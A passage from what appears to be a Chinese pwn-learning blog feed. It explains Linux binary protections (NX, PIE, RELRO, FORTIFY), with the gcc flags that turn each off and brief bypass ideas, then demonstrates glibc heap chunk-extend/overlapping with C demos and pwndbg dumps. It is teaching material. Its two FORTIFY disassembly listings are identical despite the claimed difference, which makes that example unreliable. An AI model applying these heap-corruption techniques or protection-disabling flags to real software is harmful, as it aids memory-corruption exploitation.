src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200805154723.png" alt="NX 工作原理"></p><h3 id="关闭-开启-NX"><a href="#关闭-开启-NX" class="headerlink" title="关闭/开启 NX"></a>关闭/开启 NX</h3><p>gcc编译器默认开启了NX选项, 如果需要关闭NX选项, 可以给gcc编译器添加-z execstack参数。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                  // 默认情况下, 开启NX保护</span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c     // 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c   // 开启NX保护</span><br></pre></td></tr></table></figure><p>在Windows下, 类似的概念为DEP（数据执行保护）, 在最新版的Visual Studio中默认开启了DEP编译选项</p><h3 id="绕过-NX"><a href="#绕过-NX" class="headerlink" title="绕过 NX"></a>绕过 NX</h3><p>代码重用攻击, 使用现有代码构造自身所需控制流。</p><h2 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h2><p><code>PIE(Position-Independent Executable, 位置无关可执行文件)</code>技术与 ASLR 技术类似, ASLR 将程序运行时的堆栈以及共享库的加载地址随机化, 而 PIE 技术则在编译时将程序编译为<strong>位置无关</strong>, 即程序运行时各个段加载的虚拟地址也是在装载时才确定。</p><h3 id="关闭-PIE"><a href="#关闭-PIE" class="headerlink" title="关闭 PIE"></a>关闭 PIE</h3><p>gcc 编译时加入参数 <code>-no-pie</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -no-pie code.c -o code</span><br></pre></td></tr></table></figure><h3 id="绕过-PIE"><a href="#绕过-PIE" class="headerlink" title="绕过 PIE"></a>绕过 PIE</h3><ul><li><p><strong>程序信息泄露</strong>:  同 ASLR, 通过信息泄露漏洞将某个模块中的任一代码指针或者数据指针泄露, 即可通过计算得到此模块中任意代码或数据的地址</p></li><li><p><strong>部分写入</strong>: PIE 存在一个缺陷, 那就是 PIE 的随机化只能影响到单个内存页。通常来说, 一个内存页大小为 0x1000, 所以最后的3位16进制数是不会变化的, 我们就可以通过程序信息泄露或部分写入来绕过 PIE。</p></li></ul><h2 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h2><p><code>RELRO(RELocation Read-Only, 重定位只读)</code>, 此技术主要针对 GOT 改写的攻击方式。分为部分 <strong>RELRO(Partial RELRO)</strong> 与完全 <strong>RELRO(Full RELRO)</strong> 两种</p><ul><li><strong>部分 RELRO</strong>: 在程序装入后, 将其中一段(如<code>.dynamic</code>)标记为只读, 防止程序的一些重定位信息被修改</li><li><strong>完全 RELRO</strong>:  在部分 RELRO 的基础上, 在 程序装入时, 直接解析完所有符号并填入对应的值, 此时所有的 GOT 表项都已初始化, 且不装入 <code>link_map</code> 与<code>_dl_runtime_resolve</code> 的地址(二者都是程 序动态装载的重要结构和函数)。</li></ul><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号, 从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”, 说明我们对GOT表具有写权限。</p><h3 id="关闭-开启-RELRO"><a href="#关闭-开启-RELRO" class="headerlink" title="关闭/开启 RELRO"></a>关闭/开启 RELRO</h3><p>gcc 编译参数</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                  // 默认情况下, 是Partial RELRO</span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c       // 关闭, 即No RELRO。</span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c          // 部分开启, 即Partial RELRO</span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c           // 全部开启, 即</span><br></pre></td></tr></table></figure><ul><li><code>-z now -z norelro</code>, 立即绑定, 但不添加<code>PT_GNU_RELRO</code>段, <code>.got.plt</code> 和 <code>.got</code> 都可写</li><li><code>-z relro</code>, 延时绑定, 添加<code>PT_GNU_RELRO</code>段, 只有<code>.got</code>只读, <code>.got.plt</code>依然可写</li><li><code>-z now</code>, 立即绑定, 添加<code>PT_GNU_RELRO</code>段, <code>.got</code>只读, <code>.got.plt</code>节取消(<code>plt</code>直接调用<code>.got</code>节地址了)</li></ul><h3 id="绕过-RELRO"><a href="#绕过-RELRO" class="headerlink" title="绕过 RELRO"></a>绕过 RELRO</h3><p>改写 glibc 中其他函数指针</p><h2 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h2><p>fority 用于检查是否存在缓冲区溢出的错误, 是非常轻微的检查。适用情形是程序采用大量的字符串或者内存操作函数, 如memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets以及宽字符的变体。</p><p>_FORTIFY_SOURCE设为1, 并且将编译器设置为优化1(gcc -O1), 以及出现上述情形, 那么程序编译时就会进行检查但又不会改变程序功能</p><p>_FORTIFY_SOURCE设为2, 有些检查功能会加入, 但是这可能导致程序崩溃。</p><p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 #include &lt;string.h&gt;)</p><p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出, 就终止程序)</p><p>举个例子可能简单明了一些, 下面一段简单的存在缓冲区溢出的C代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun</span><span class="params">(<span class="keyword">char</span> *s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(buf, s);</span><br><span class="line">        <span class="comment">/* Don&#x27;t allow gcc to optimise away the buf */</span></span><br><span class="line">        <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> :: <span class="string">&quot;m&quot;</span> (buf))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用包含参数-U_FORTIFY_SOURCE编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ;</span><br><span class="line">  mov    %esp, %ebp</span><br><span class="line">  sub    $0x118, %esp        ; 将0x118存储到栈上</span><br><span class="line">  mov    0x8(%ebp), %eax     ; 将目标参数载入eax</span><br><span class="line">  mov    %eax, 0x4(%esp)     ; 保存目标参数</span><br><span class="line">  lea    -0x108(%ebp), %eax  ; 数组buf</span><br><span class="line">  mov    %eax, (%esp)        ; 保存</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line">  leave                     ;</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>用包含参数-D_FORTIFY_SOURCE=2编译</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ;</span><br><span class="line">  mov    %esp, %ebp</span><br><span class="line">  sub    $0x118, %esp        ; 将0x118存储到栈上</span><br><span class="line">  mov    0x8(%ebp), %eax     ; 将目标参数载入eax</span><br><span class="line">  mov    %eax, 0x4(%esp)     ; 保存目标参数</span><br><span class="line">  lea    -0x108(%ebp), %eax  ; 数组buf</span><br><span class="line">  mov    %eax, (%esp)        ; 保存</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line">  leave                     ;</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><p>我们可以看到gcc生成了一些附加代码, 通过对数组大小的判断替换strcpy, memcpy, memset等函数名, 达到防止缓冲区溢出的作用。</p><p>总结下就有:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                        // 默认情况下, 不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c    // 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c    // 较强的检查</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>各种安全选择的编译参数如下:</p><ul><li>NX:<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary:<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE:<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>ASLR: Ubuntu下 <code>sudo sysctl -w kernel.randomize_va_space=0</code> 进行关闭</li><li>RELRO:<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">linux程序的常用保护机制</a><br><a href="http://jcs.iie.ac.cn/xxaqxb/ch/reader/create_pdf.aspx?file_no=20180101&flag=1&year_id=2018&quarter_id=1">Glibc 堆利用的若干方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunk Extend and Overlapping</title>
      <link href="/note-pwn-chunk-extend-and-overlapping/"/>
      <url>/note-pwn-chunk-extend-and-overlapping/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>chunk extend (堆块扩展)是堆漏洞一种常见利用手法, 通过 extend 可以实现 chunk overlapping (堆块重叠)</p><ul><li>程序中存在基于堆块的漏洞</li><li>漏洞可以控制 chunk header 中的数据</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>chunk extend 技术能够产生的原因在于 ptmalloc 在堆 chunk 进行操作时使用的各种宏</p><h3 id="获取-chunk-块大小"><a href="#获取-chunk-块大小" class="headerlink" title="获取 chunk 块大小"></a>获取 chunk 块大小</h3><p>在 ptmalloc 中, 获取 chunk 块大小的操作如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure><p>一种是直接获取 chunk 的大小, 不忽略掩码部分, 另一种是忽略掩码部分</p><h3 id="获取下一-chunk-块地址"><a href="#获取下一-chunk-块地址" class="headerlink" title="获取下一 chunk 块地址"></a>获取下一 chunk 块地址</h3><p>在 ptmalloc 中, 获取下一 chunk 块的地址的操作如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></span><br></pre></td></tr></table></figure><p>利用了隐式链表的技术, 就是当前块指针加上当前块的大小</p><h3 id="获取前一个-chunk-信息"><a href="#获取前一个-chunk-信息" class="headerlink" title="获取前一个 chunk 信息"></a>获取前一个 chunk 信息</h3><p>在 ptmalloc 中, 获取前一个 chunk 信息的操作如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></span><br></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;pre_size 获取前一个块大小, 然后利用本 chunk 地址减去所得大小</p><h3 id="判断当前-chunk-是否-inuse"><a href="#判断当前-chunk-是否-inuse" class="headerlink" title="判断当前 chunk 是否 inuse"></a>判断当前 chunk 是否 inuse</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)</span></span><br><span class="line">    ((((mchunkptr)(((<span class="keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域, 而下一块的地址又如我们前面所述是根据当前 chunk 的 size 计算得出的</p><p> chunk 的判断 就是依赖于malloc_chunk结构体里面的内容, 简单来说就是chunk_header<br>, 那么利用思路就自然而然的出来了, 我们通过堆漏洞（heap overflow之类的）可以改变chunk_header进而实现漏洞利用</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>通过上面几个宏可以看出, ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对 chunk 的前后块进行定位。那么我们可以通过堆漏洞堆 chunk header 进行修改, 从而改变 chunk header 进而实现漏洞利用</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><blockquote><p>示例都是在64位下进行, 如果想在32位下进行, 应把8字节偏移改为4字节</p></blockquote><h3 id="对-inuse-的-fastbin-进行-extend"><a href="#对-inuse-的-fastbin-进行-extend" class="headerlink" title="对 inuse 的 fastbin 进行 extend"></a>对 inuse 的 fastbin 进行 extend</h3><blockquote><p>更改第一个块的大小来控制第二个块的内容<br>libc version: 2.23</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr1, *ptr2;</span><br><span class="line"></span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// 分配大小为0x10的 chunk1</span></span><br><span class="line"></span><br><span class="line">    ptr2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// 分配大小为0x10的 chunk2</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr1 - <span class="number">0x8</span>) = <span class="number">0x41</span>; <span class="comment">// 修改 chunk1 的 size 域</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr1); <span class="comment">// 释放 chunk1</span></span><br><span class="line"></span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>); <span class="comment">// 实现 extend</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>malloc 两块 chunk 后堆分布如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000021  &lt;=== chunk1</span><br><span class="line">0x602010:       0x0000316b6e756863      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000021  &lt;=== chunk2</span><br><span class="line">0x602030:       0x0000326b6e756863      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000020fc1  &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>之后, 我们把 chunk1 的 size 域更改为 0x41, 0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为0x40。在题目中这一步可以由堆溢出得到。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== 篡改大小</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602040:   0x0000000000000000  0x0000000000020fc1</span><br></pre></td></tr></table></figure><p>执行 free 之后, 我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk, 一起释放了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x602000</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x602040</span><br><span class="line">Size: 0x20fc1</span><br></pre></td></tr></table></figure><p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块, 此时就可以直接控制 chunk2 中的内容, 我们也把这种状态称为 overlapping chunk。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo 0x602000</span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x40</span><br><span class="line">prev_inused : 1</span><br><span class="line">is_mmap : 0</span><br><span class="line">non_mainarea : 0</span><br></pre></td></tr></table></figure><h3 id="对-inuse-的-smallbin-进行-extend"><a href="#对-inuse-的-smallbin-进行-extend" class="headerlink" title="对 inuse 的 smallbin 进行 extend"></a>对 inuse 的 smallbin 进行 extend</h3><p>通过之前深入理解堆的实现部分的内容, 我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中, 而不处于这个范围的 chunk 被释放后会被置于unsorted bin链表中。 以下这个示例中, 我们使用 0x80 这个大小来分配堆（作为对比, fastbin 默认的最大的 chunk 可使用范围是0x70）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr, *ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">// 分配大小为 0x80 的chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第二个 0x10 的 chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//防止与top chunk合并</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span> *)((<span class="keyword">int</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中, 因为分配的 size 不处于 fastbin 的范围, 因此在释放时如果与 top chunk 相连会导致和top chunk合并。所以我们需要额外分配一个chunk, 把释放的块与top chunk隔开。</p><p>malloc 三块 chunk 以后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE  &lt;=== chunk1</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE  &lt;=== chunk2</span><br><span class="line">Addr: 0x405090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE  &lt;=== chunk3</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE        &lt;=== top chunk</span><br><span class="line">Addr: 0x4050d0</span><br><span class="line">Size: 0x20f31</span><br></pre></td></tr></table></figure><p>修改 chunk1 的 size 域为0xb1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/32gx 0x405000</span><br><span class="line">0x405000:       0x0000000000000000      0x00000000000000b1 &lt;=== chunk1</span><br><span class="line">0x405010:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405070:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405080:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405090:       0x0000000000000000      0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x4050a0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4050b0:       0x0000000000000000      0x0000000000000021 &lt;=== chunk3</span><br><span class="line">0x4050c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4050d0:       0x0000000000000000      0x0000000000020f31 &lt;=== top chunk</span><br><span class="line">0x4050e0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4050f0:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>释放后, chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd4b78</span><br><span class="line">bk: 0x7ffff7dd4b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050d0</span><br><span class="line">Size: 0x20f31</span><br></pre></td></tr></table></figure><p>此时 unsorted bin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; unsorted</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x405000 —▸ 0x7ffff7dd4b78 (main_arena+88) ◂— 0x405000</span><br></pre></td></tr></table></figure><p>再次进行分配的时候就会取回 chunk1 和 chunk2 的空间, 此时我们就可以控制 chunk2 中的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050d0</span><br><span class="line">Size: 0x20f31</span><br></pre></td></tr></table></figure><h3 id="对-free-的-smallbin-进行-extend"><a href="#对-free-的-smallbin-进行-extend" class="headerlink" title="对 free 的 smallbin 进行 extend"></a>对 free 的 smallbin 进行 extend</h3><p>在上一代码基础上进行的, 这次先释放 chunk1, 然后再修改处于 unsorted bin 中的 chunk1 的 size 域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr, *ptr1;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>); <span class="comment">// 分配大小为0x80的 chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);       <span class="comment">// 分配大小为0x10的 chunk2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr);          <span class="comment">// 首先进行释放, 使得chunk1进入unsorted bin</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr - <span class="number">0x8</span>) = <span class="number">0xb1</span>;</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两次 malloc 之后的结果如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE &lt;=== chunk1</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE &lt;=== chunk2</span><br><span class="line">Addr: 0x405090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE       &lt;=== top chunk</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x20f51</span><br></pre></td></tr></table></figure><p>我们首先释放 chunk1 使它进入 unsorted bin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x405000 —▸ 0x7ffff7dd4b78 (main_arena+88) ◂— 0x405000</span><br></pre></td></tr></table></figure><p>然后篡改 chunk1 的 size 域</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x405000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd4b78</span><br><span class="line">bk: 0x7ffff7dd4b78</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x4050b0</span><br><span class="line">Size: 0x20f51</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8gx 0x405000</span><br><span class="line">0x405000:       0x0000000000000000      0x00000000000000b1 &lt;=== size域被篡改</span><br><span class="line">0x405010:       0x00007ffff7dd4b78      0x00007ffff7dd4b78</span><br><span class="line">0x405020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x405030:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块, 从而控制了chunk2 的内容</p><h2 id="Chunk-Extend-Shrink-可以做什么"><a href="#Chunk-Extend-Shrink-可以做什么" class="headerlink" title="Chunk Extend/Shrink 可以做什么"></a>Chunk Extend/Shrink 可以做什么</h2><p>一般来说, 这种技术并不能直接控制程序的执行流程, 但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等, 就可以利用这些指针来进行信息泄漏和控制执行流程。</p><p>此外通过 extend 可以实现 chunk overlapping, 通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用</p><h3 id="通过-extend-后向-overlapping"><a href="#通过-extend-后向-overlapping" class="headerlink" title="通过 extend 后向 overlapping"></a>通过 extend 后向 overlapping</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr, *ptr1;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//分配第1个 0x80 的 chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第2个 0x10 的 chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第3个 0x10 的 chunk3</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//分配第4个 0x10 的 chunk4</span></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0x61</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1 = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 malloc(0x50) 对 extend 区域重新占位后, 其中 0x10 的 fastbin 块依然可以正常的分配和释放, 此时已经构成 overlapping, 通过对overlapping 